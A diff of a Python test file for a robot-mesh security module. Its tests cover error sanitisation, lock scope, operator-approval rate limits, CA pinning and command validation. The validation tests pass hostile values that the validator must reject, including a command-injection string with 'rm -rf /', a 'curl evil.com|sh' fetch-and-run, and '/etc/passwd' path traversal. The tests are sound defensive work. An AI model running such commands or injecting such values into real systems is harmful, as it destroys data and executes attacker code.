@@ -236,7 +236,7 @@ def test_audit_disk_format_canonical(monkeypatch, tmp_path):
     from strands_robots.mesh import audit
 
     audit._SEQ_COUNTERS.clear()
-    audit._SEQ_LOADED = False
+    audit._AUDIT_STATE.seq_loaded = False
     audit.log_safety_event("estop", "x", {"z": 1, "a": 2, "m": 3})
     line = audit.audit_log_path().read_text().strip()
     # Keys in record + payload should be alphabetically sorted.
@@ -339,7 +339,7 @@ def test_audit_seq_per_peer_no_phantom_gaps(monkeypatch, tmp_path):
     from strands_robots.mesh import audit
 
     audit._SEQ_COUNTERS.clear()
-    audit._SEQ_LOADED = False
+    audit._AUDIT_STATE.seq_loaded = False
     # Interleaved writes from two peers.
     for i in range(5):
         audit.log_safety_event("e", "peer-a", {"i": i})
@@ -398,7 +398,7 @@ def test_lockout_raises_lockouterror_and_audits(monkeypatch, tmp_path):
     from strands_robots.mesh.core import Mesh
 
     audit._SEQ_COUNTERS.clear()
-    audit._SEQ_LOADED = False
+    audit._AUDIT_STATE.seq_loaded = False
     mock_robot = MagicMock()
     m = Mesh(mock_robot, peer_id="r1")
     m._estop_lockout.set()
@@ -595,7 +595,7 @@ def test_audit_seq_persists_across_process_restart(monkeypatch, tmp_path):
 
     # Process 1: write three events.
     audit._SEQ_COUNTERS.clear()
-    audit._SEQ_LOADED = False
+    audit._AUDIT_STATE.seq_loaded = False
     for i in range(3):
         audit.log_safety_event("e", "peer-a", {"i": i})
     assert audit._SEQ_COUNTERS["peer-a"] == 3
@@ -610,7 +610,7 @@ def test_audit_seq_persists_across_process_restart(monkeypatch, tmp_path):
 
     # Process 2: simulate restart by clearing in-memory state.
     audit._SEQ_COUNTERS.clear()
-    audit._SEQ_LOADED = False
+    audit._AUDIT_STATE.seq_loaded = False
 
     # Next event must continue from 4, not restart at 1.
     audit.log_safety_event("e", "peer-a", {"i": "after-restart"})
@@ -629,7 +629,7 @@ def test_audit_bad_signature_does_not_advance_per_peer_cursor(monkeypatch, tmp_p
     from strands_robots.mesh import audit
 
     audit._SEQ_COUNTERS.clear()
-    audit._SEQ_LOADED = False
+    audit._AUDIT_STATE.seq_loaded = False
     # Write three legit signed records.
     for i in range(3):
         audit.log_safety_event("e", "peer-a", {"i": i})
@@ -717,16 +717,447 @@ def test_robot_mesh_interrupt_does_not_swallow_arbitrary_exceptions(monkeypatch,
 
 
 def test_psk_warned_global_is_used_by_helper(monkeypatch):
-    """The _PSK_WARNED hoist (CodeQL #219) refactored the conditional
-    global into _warn_psk_unset_once(). Pin that the helper exists, sets
-    the flag, and is idempotent.
+    """CodeQL #219 / #223 — the one-shot ``_PSK_WARNED`` flag was refactored
+    onto a module-level state object (``_PROCESS_STATE.psk_warned``) so
+    static analysers see a normal attribute read+write rather than a bare
+    ``global`` declaration on a scalar (which CodeQL kept mis-classifying
+    as "unused global variable" even after the helper hoist).
+
+    Pin that:
+    - the helper ``_warn_psk_unset_once`` still exists,
+    - calling it sets ``_PROCESS_STATE.psk_warned``,
+    - subsequent calls are idempotent.
     """
     from strands_robots.mesh import security as sec
 
-    sec._PSK_WARNED = False
-    assert hasattr(sec, "_warn_psk_unset_once"), "the _PSK_WARNED refactor must expose _warn_psk_unset_once"
+    assert hasattr(sec, "_PROCESS_STATE"), "the refactor must expose _PROCESS_STATE"
+    assert hasattr(sec, "_warn_psk_unset_once"), "the helper must still exist"
+
+    sec._PROCESS_STATE.psk_warned = False
     sec._warn_psk_unset_once()
-    assert sec._PSK_WARNED is True
+    assert sec._PROCESS_STATE.psk_warned is True
     # Idempotent — second call must not flip anything weird.
     sec._warn_psk_unset_once()
-    assert sec._PSK_WARNED is True
+    assert sec._PROCESS_STATE.psk_warned is True
+
+    # Defensive: the legacy module-level scalar must NOT exist any more —
+    # if a future refactor reintroduces it, CodeQL #219 / #223 would
+    # reopen.
+    assert not hasattr(sec, "_PSK_WARNED"), (
+        "Legacy _PSK_WARNED scalar reintroduced — CodeQL #219/#223 will reopen. Use _PROCESS_STATE.psk_warned."
+    )
+
+
+# ───────────────────────────────────────────────────────────────────────────
+# Round 3 — additional review feedback from yinsong1986 (PR #194 round 3)
+# ───────────────────────────────────────────────────────────────────────────
+
+
+def test_r3_1_dispatch_error_does_not_leak_internal_detail_on_wire(monkeypatch):
+    """R3-1: ``core.py`` dispatch-exception fallback must NOT leak the
+    underlying ``str(exc)`` onto the response topic.
+
+    Internal exception detail (paths, attribute names, library traces)
+    is operationally useful in local logs but a defence-in-depth liability
+    on the wire — it gives a remote (possibly attacker-controlled) caller
+    fragments to pivot on. The structured ``ValidationError`` /
+    ``LockoutError`` paths emit precise generic messages; the catch-all
+    must do the same.
+    """
+    from unittest.mock import patch
+
+    from strands_robots.mesh.core import Mesh
+
+    captured: list[tuple[str, dict]] = []
+
+    class _StubMesh(Mesh):
+        def _put_signed(self, key, payload):  # type: ignore[override]
+            captured.append((key, payload))
+
+    class _Robot:
+        def get_features(self):
+            return {}
+
+    m = _StubMesh.__new__(_StubMesh)
+    Mesh.__init__(m, _Robot(), peer_id="me")
+
+    with patch.object(m, "_dispatch", side_effect=RuntimeError("/secret/path/leaked.py:42")):
+        m._exec_cmd({"sender_id": "alice", "turn_id": "t1", "command": {"action": "status"}})
+
+    err_payload = next(p for k, p in captured if k == "strands/alice/response/t1")
+    assert err_payload["type"] == "error"
+    # Must be the static sanitised string, not the RuntimeError contents.
+    assert err_payload["error"] == "dispatch error"
+    assert "/secret/path" not in err_payload["error"]
+    assert "leaked.py" not in err_payload["error"]
+
+
+def test_r3_2_consume_peer_token_releases_registry_lock_before_consume(monkeypatch):
+    """R3-2: ``consume_peer_token`` must NOT hold ``_PEER_RATE_LOCK`` while
+    calling ``bucket.consume()``.
+
+    The TokenBucket has its own internal lock, so holding the registry
+    lock during consume() serialises every per-sender check across the
+    whole process — defeating the point of per-bucket locks at high
+    command volume across many peers. We pin the contract by source
+    inspection: the consume call must live OUTSIDE the ``with
+    _PEER_RATE_LOCK:`` block.
+    """
+    import inspect
+
+    from strands_robots.mesh import security as sec
+
+    src = inspect.getsource(sec.consume_peer_token)
+    # Confirm there's a ``with _PEER_RATE_LOCK:`` block at all
+    # (the test below pins where the consume call lives relative
+    # to it).
+    assert "with _PEER_RATE_LOCK:" in src
+    # The bucket.consume call must come AFTER the with block — i.e. its
+    # indentation must be back at the function level, not inside the with.
+    lines = src.splitlines()
+    in_with_block = False
+    consume_line: str | None = None
+    consume_indent: int | None = None
+    with_indent: int | None = None
+    for line in lines:
+        stripped = line.lstrip()
+        indent = len(line) - len(stripped)
+        if stripped.startswith("with _PEER_RATE_LOCK"):
+            in_with_block = True
+            with_indent = indent
+            continue
+        if in_with_block and with_indent is not None and indent <= with_indent and stripped:
+            in_with_block = False
+        if "bucket.consume(" in line:
+            consume_line = line
+            consume_indent = indent
+            # We want the LAST consume call (the actual return).
+    assert consume_line is not None, "consume_peer_token must call bucket.consume"
+    assert with_indent is not None
+    assert consume_indent is not None
+    assert consume_indent <= with_indent, (
+        "bucket.consume(...) is still inside `with _PEER_RATE_LOCK:` — "
+        "this serialises every per-sender check across the whole process. "
+        "Move the consume call OUTSIDE the with block (TokenBucket has its "
+        "own internal lock)."
+    )
+
+
+def test_r3_3_declined_hitl_approval_does_not_consume_rate_slot():
+    """R3-3: a declined operator approval must NOT consume a slot in the
+    sliding-window rate-limit history.
+
+    Without the split between check-and-record, three nuisance LLM
+    prompts an operator declines within a minute would lock the agent
+    out of issuing a real ``emergency_stop`` (capped at 3/min). The
+    rate limit exists to bound LLM-driven nuisance, not to inhibit a
+    genuine emergency.
+    """
+    import strands_robots.tools.robot_mesh as rmt
+
+    rmt._reset_rate_limits()
+    # Unwrap the @tool-decorated callable (existing pattern in this file).
+    fn = getattr(rmt.robot_mesh, "__wrapped__", rmt.robot_mesh)
+    ctx = _ctx(response="n")  # operator declines every time
+
+    # Decline 3 emergency_stops in a row (the cap is 3/min).
+    for _ in range(3):
+        result = fn(action="emergency_stop", tool_context=ctx)
+        assert result["status"] == "error"
+        assert "declined" in result["content"][0]["text"]
+
+    # The history bucket must STILL be empty because every approval was
+    # declined — no slot consumed.
+    with rmt._RATE_LOCK:
+        bucket = rmt._RATE_HISTORY.get("emergency_stop")
+        assert bucket is None or len(bucket) == 0, (
+            "Declined approvals consumed rate-limit slots — a genuine "
+            "emergency_stop is now locked out for up to 60s. R3-3 reopened."
+        )
+
+    # And a 4th attempt — also declined — must STILL not be rate-limited
+    # (the rejection reason must say "declined", not "rate limit").
+    result = fn(action="emergency_stop", tool_context=ctx)
+    assert result["status"] == "error"
+    text = result["content"][0]["text"].lower()
+    assert "declined" in text
+    assert "rate limit" not in text
+
+
+def test_r3_3_approved_hitl_action_consumes_slot():
+    """R3-3 (cont.): an APPROVED action must consume a slot — otherwise
+    LLM-driven nuisance is unbounded.
+    """
+    import strands_robots.tools.robot_mesh as rmt
+
+    rmt._reset_rate_limits()
+    fn = getattr(rmt.robot_mesh, "__wrapped__", rmt.robot_mesh)
+    ctx = _ctx(response="y")  # operator approves
+
+    # Patch _resolve_mesh to a stub mesh so the approved action can run
+    # without an actual networked mesh.
+    stub_mesh = MagicMock()
+    stub_mesh.emergency_stop.return_value = []
+    with patch("strands_robots.tools.robot_mesh._resolve_mesh", return_value=stub_mesh):
+        result = fn(action="emergency_stop", tool_context=ctx)
+
+    # The action ran (operator approved) — slot must be recorded.
+    assert result["status"] == "success", f"approved emergency_stop should succeed, got {result}"
+    with rmt._RATE_LOCK:
+        bucket = rmt._RATE_HISTORY.get("emergency_stop")
+        assert bucket is not None and len(bucket) == 1, (
+            "Approved emergency_stop did NOT consume a rate-limit slot — "
+            "LLM nuisance is now unbounded. R3-3 (record path) reopened."
+        )
+
+
+def test_r3_3_non_interrupt_action_consumes_slot():
+    """R3-3: actions that do NOT require an interrupt (e.g. ``tell``)
+    must consume a slot unconditionally — matching the pre-split
+    behaviour for non-fleet-wide actions.
+    """
+    import strands_robots.tools.robot_mesh as rmt
+
+    rmt._reset_rate_limits()
+    fn = getattr(rmt.robot_mesh, "__wrapped__", rmt.robot_mesh)
+    ctx = _ctx()
+
+    stub_mesh = MagicMock()
+    stub_mesh.tell.return_value = "tell-result"
+    with patch("strands_robots.tools.robot_mesh._resolve_mesh", return_value=stub_mesh):
+        fn(action="tell", target="x", instruction="hi", tool_context=ctx)
+
+    with rmt._RATE_LOCK:
+        bucket = rmt._RATE_HISTORY.get("tell")
+        assert bucket is not None and len(bucket) == 1
+
+
+def test_r3_4_provision_existing_ca_always_raw_pin_checked(tmp_path, monkeypatch):
+    """R3-4: When a CA file already exists on disk, ``_ensure_ca`` MUST
+    always do the raw hash compare regardless of
+    ``STRANDS_MESH_DISABLE_CA_PIN``. The break-glass exists for the
+    *download* path (re-encoding proxies); silently re-using a rogue
+    CA from a prior compromised provisioning run is strictly worse than
+    re-fetching every time.
+    """
+    from strands_robots.mesh.iot import provision
+
+    # Set the break-glass loud and clear.
+    monkeypatch.setenv("STRANDS_MESH_DISABLE_CA_PIN", "true")
+
+    # Plant a rogue CA file at the canonical location.
+    ca_path = tmp_path / "AmazonRootCA1.pem"
+    ca_path.write_bytes(b"-----BEGIN ROGUE CA-----\nfake bytes\n-----END ROGUE CA-----\n")
+
+    # Even with the break-glass set, the existing-file branch must
+    # raise — defending against the silent-rogue-reuse attack.
+    with pytest.raises(RuntimeError, match="failed pin check"):
+        provision._ensure_ca(ca_path)
+
+    # The file must still be on disk (we don't auto-delete; the caller
+    # must do that explicitly).
+    assert ca_path.exists()
+
+
+def test_r3_5_validate_command_blocks_pretrained_name_or_path(monkeypatch):
+    """R3-5: ``validate_command`` must reject ``pretrained_name_or_path``
+    that doesn't match the HF org allowlist, even on otherwise valid
+    execute/start commands. Threat-vector #3 is reachable via this kwarg
+    without the gate.
+    """
+    monkeypatch.delenv("STRANDS_MESH_HF_REPO_ALLOW", raising=False)
+    from strands_robots.mesh import security as sec
+
+    base_cmd = {
+        "action": "execute",
+        "instruction": "do thing",
+        "policy_host": "localhost",
+    }
+
+    # Default allowlist accepts known-good orgs (lerobot, nvidia, huggingface).
+    ok = sec.validate_command(dict(base_cmd, pretrained_name_or_path="lerobot/pi0"))
+    assert ok["pretrained_name_or_path"] == "lerobot/pi0"
+
+    # Attacker-controlled org must be rejected.
+    with pytest.raises(sec.ValidationError, match="pretrained_name_or_path"):
+        sec.validate_command(dict(base_cmd, pretrained_name_or_path="evil-corp/backdoor-model"))
+
+    # Path traversal must be rejected.
+    with pytest.raises(sec.ValidationError, match="pretrained_name_or_path"):
+        sec.validate_command(dict(base_cmd, pretrained_name_or_path="lerobot/../evil/x"))
+
+    # Shell metacharacters must be rejected.
+    with pytest.raises(sec.ValidationError):
+        sec.validate_command(dict(base_cmd, pretrained_name_or_path="lerobot/pi0; rm -rf /"))
+
+
+def test_r3_5_validate_command_hf_repo_allow_extends(monkeypatch):
+    """R3-5: ``STRANDS_MESH_HF_REPO_ALLOW`` extends the org allowlist."""
+    from strands_robots.mesh import security as sec
+
+    monkeypatch.setenv("STRANDS_MESH_HF_REPO_ALLOW", "my-org,trusted-team/specific-model")
+
+    base_cmd = {
+        "action": "execute",
+        "instruction": "x",
+        "policy_host": "localhost",
+    }
+
+    # Org-prefix allow → all repos under my-org/ pass.
+    ok = sec.validate_command(dict(base_cmd, pretrained_name_or_path="my-org/whatever"))
+    assert ok["pretrained_name_or_path"] == "my-org/whatever"
+
+    # Specific full prefix allow → only that prefix.
+    ok = sec.validate_command(dict(base_cmd, pretrained_name_or_path="trusted-team/specific-model"))
+    assert ok["pretrained_name_or_path"] == "trusted-team/specific-model"
+
+    # Different repo from the allowed team is NOT auto-allowed.
+    with pytest.raises(sec.ValidationError):
+        sec.validate_command(dict(base_cmd, pretrained_name_or_path="trusted-team/other-model"))
+
+
+def test_r3_5_validate_command_blocks_model_path_traversal():
+    """R3-5: ``model_path`` rejects shell metacharacters and ``..``
+    traversal segments even when not requiring HF org match."""
+    from strands_robots.mesh import security as sec
+
+    base_cmd = {
+        "action": "execute",
+        "instruction": "x",
+        "policy_host": "localhost",
+    }
+
+    # Plain local path is OK.
+    ok = sec.validate_command(dict(base_cmd, model_path="/opt/models/my-model"))
+    assert ok["model_path"] == "/opt/models/my-model"
+
+    # Path traversal is NOT.
+    with pytest.raises(sec.ValidationError, match="model_path"):
+        sec.validate_command(dict(base_cmd, model_path="/opt/../etc/passwd"))
+
+    # Shell metacharacters are NOT.
+    with pytest.raises(sec.ValidationError):
+        sec.validate_command(dict(base_cmd, model_path="/tmp/m;curl evil.com|sh"))
+
+    # NUL bytes / control characters are NOT.
+    with pytest.raises(sec.ValidationError):
+        sec.validate_command(dict(base_cmd, model_path="/tmp/m\x00malicious"))
+
+
+def test_r3_5_validate_command_blocks_unknown_policy_type():
+    """R3-5: ``policy_type`` rejects values not in the allowlist."""
+    from strands_robots.mesh import security as sec
+
+    base_cmd = {
+        "action": "execute",
+        "instruction": "x",
+        "policy_host": "localhost",
+    }
+
+    ok = sec.validate_command(dict(base_cmd, policy_type="act"))
+    assert ok["policy_type"] == "act"
+
+    ok = sec.validate_command(dict(base_cmd, policy_type="MOCK"))
+    assert ok["policy_type"] == "mock"  # canonicalised lowercase
+
+    with pytest.raises(sec.ValidationError, match="policy_type"):
+        sec.validate_command(dict(base_cmd, policy_type="evil_remote_exec"))
+
+
+def test_r3_5_validate_command_blocks_server_address_offnet(monkeypatch):
+    """R3-5: ``server_address`` must check the host against the policy-host
+    allowlist. The default allowlist is loopback only, so an external
+    IP must be rejected unless ``STRANDS_MESH_POLICY_HOST_ALLOW`` permits.
+    """
+    monkeypatch.delenv("STRANDS_MESH_POLICY_HOST_ALLOW", raising=False)
+    from strands_robots.mesh import security as sec
+
+    base_cmd = {
+        "action": "execute",
+        "instruction": "x",
+        "policy_host": "localhost",
+    }
+
+    # Loopback OK.
+    ok = sec.validate_command(dict(base_cmd, server_address="tcp://127.0.0.1:5555"))
+    assert ok["server_address"].endswith(":5555")
+
+    # Off-network blocked.
+    with pytest.raises(sec.ValidationError, match="server_address"):
+        sec.validate_command(dict(base_cmd, server_address="tcp://198.51.100.1:5555"))
+
+    # ALSO blocked: looks like loopback but is actually a hostname trick.
+    with pytest.raises(sec.ValidationError):
+        sec.validate_command(dict(base_cmd, server_address="tcp://attacker.example.com:5555"))
+
+
+def test_r3_6_audit_seq_loaded_lives_on_state_object():
+    """R3-6: ``_SEQ_LOADED`` was refactored onto ``_AUDIT_STATE.seq_loaded``
+    so static analysers don't trip on a bare ``global`` for a module-
+    level scalar (CodeQL #222).
+    """
+    from strands_robots.mesh import audit
+
+    assert hasattr(audit, "_AUDIT_STATE"), "the refactor must expose _AUDIT_STATE"
+    assert hasattr(audit._AUDIT_STATE, "seq_loaded")
+    # Defensive: legacy scalar must not be reintroduced.
+    assert not hasattr(audit, "_SEQ_LOADED"), (
+        "Legacy _SEQ_LOADED scalar reintroduced — CodeQL #222 will reopen. Use _AUDIT_STATE.seq_loaded."
+    )
+
+
+def test_r3_7_persist_seq_chmod_failure_documented():
+    """R3-7: the chmod best-effort except-pass in ``_persist_seq_counters``
+    has an explanatory comment so CodeQL #225 stays closed.
+    """
+    import inspect
+
+    from strands_robots.mesh import audit
+
+    src = inspect.getsource(audit._persist_seq_counters)
+    # Find the chmod block.
+    assert "os.chmod(sidecar, 0o600)" in src
+    # The except OSError: must be followed by a non-empty comment line
+    # before `pass` — CodeQL specifically flags `except: pass` with no
+    # comment.
+    idx = src.index("except OSError:\n")
+    tail = src[idx:]
+    # The next 5 lines should include at least one #-comment line before
+    # ``pass``.
+    next_lines = tail.splitlines()[1:6]
+    has_comment = any(line.strip().startswith("#") for line in next_lines)
+    assert has_comment, (
+        "_persist_seq_counters chmod block has empty `except OSError: pass` "
+        "with no explanatory comment — CodeQL #225 will reopen."
+    )
+
+
+def test_r3_8_sensors_loop_mixin_has_no_stray_docstring():
+    """R3-8: ``SensorLoopsMixin`` had two consecutive docstrings, the
+    second one parsed as a no-effect string-statement (CodeQL #224).
+    Class body must contain only one (the first) docstring.
+    """
+    import ast
+    import inspect
+
+    from strands_robots.mesh import sensors
+
+    src = inspect.getsource(sensors.SensorLoopsMixin)
+    tree = ast.parse(src)
+    cls = tree.body[0]
+    assert isinstance(cls, ast.ClassDef)
+
+    # Walk the class body and count bare string-expression statements.
+    # The very first child can be a docstring; any *additional* string
+    # expression is a CodeQL #224 statement-with-no-effect.
+    stray_strings = []
+    for i, node in enumerate(cls.body):
+        if isinstance(node, ast.Expr) and isinstance(node.value, ast.Constant) and isinstance(node.value.value, str):
+            if i > 0:
+                stray_strings.append(node.lineno)
+
+    assert not stray_strings, (
+        f"SensorLoopsMixin has {len(stray_strings)} stray string "
+        f"expression(s) at lines {stray_strings} — CodeQL #224 will "
+        "reopen. Move all class-level prose into the single first docstring."
+    )
